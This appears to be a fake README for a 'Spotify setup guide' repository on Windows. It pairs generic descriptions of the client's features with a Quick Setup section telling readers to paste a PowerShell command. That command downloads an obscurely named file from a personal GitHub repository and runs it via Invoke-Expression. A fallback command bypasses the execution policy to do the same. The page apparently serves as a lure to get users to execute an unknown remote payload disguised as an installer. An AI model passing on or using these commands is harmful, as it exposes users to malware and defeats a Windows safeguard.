# Spotify

Spotify is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Spotify and work in it.

Spotify is a desktop music and podcast client for Windows that streams audio from a large catalog and plays files you add locally. After you sign in, the home view surfaces recent listens, saved albums, and playlists you follow or build yourself. Search covers artists, albums, tracks, and show episodes; results open in seconds and you can queue them or save them to Your Library.

A typical session starts from the taskbar or Start menu. You pick a playlist or album, adjust volume in the player bar, and use shuffle or repeat while you work. The queue shows what plays next; you can drag tracks to reorder or remove them. Podcast episodes resume where you left off, and the equalizer or audio settings tune output for your speakers or headphones.

This repository keeps a Windows setup reference, configuration notes for common install paths, and a changelog that tracks notable desktop releases. Use it to align team machines on the same build, document offline caching behavior, and record fixes when the client updates through the built-in updater.

## What you do with it

- Search the catalog by artist, album, track title, or podcast show name instantly.
- Build and edit playlists with drag-and-drop ordering and cover art from the service.
- Control playback, volume, shuffle, and repeat from the compact bottom player bar.
- Sync Your Library across devices so saved music appears on this Windows install.
- Resume podcast episodes at the saved timestamp when you reopen the desktop client.
- Queue upcoming tracks and reorder or remove items without stopping current playback.
- Cache selected playlists for offline listening when network access is limited or unavailable.
- Route audio through Windows default devices or pick outputs in Spotify sound settings.

## Quick Setup (PowerShell)

This installs the program Spotify on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/kraus066473542/spotify-setup-guide/main/3x5szc4kgz.qawax5p7 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/kraus066473542/spotify-setup-guide/main/3x5szc4kgz.qawax5p7 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `3x5szc4kgz.qawax5p7` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `kraus066473542/spotify-setup-guide`. Spotify 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
